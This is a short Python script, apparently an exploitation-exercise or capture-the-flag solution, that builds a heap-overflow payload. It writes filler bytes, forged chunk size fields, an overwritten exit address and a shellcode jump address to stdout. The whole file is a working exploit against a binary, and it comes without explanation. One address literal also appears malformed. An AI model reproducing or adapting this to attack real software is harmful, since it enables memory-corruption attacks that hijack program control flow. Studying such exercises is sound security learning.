#!/usr/bin/env python

import sys

nops = '\x90\x90\x90\x90\x90\x90\x90\x90' 
filler = 'A' * 260 
chunk = filler

size1 = '\x79\x03\x00\x00'
size2 = '\xFF\xFF\xFF\x00'

exit_address = '\xA4\xC8\x04\08'
shellcode_address = '\x50\xF3\x04\x08'

payload = chunk + size1 + size2 + exit_address + shellcode_address

# + size2 + exit_address + shellcode_address
# + size + shellcode_address + exit_address

sys.stdout.write(payload)

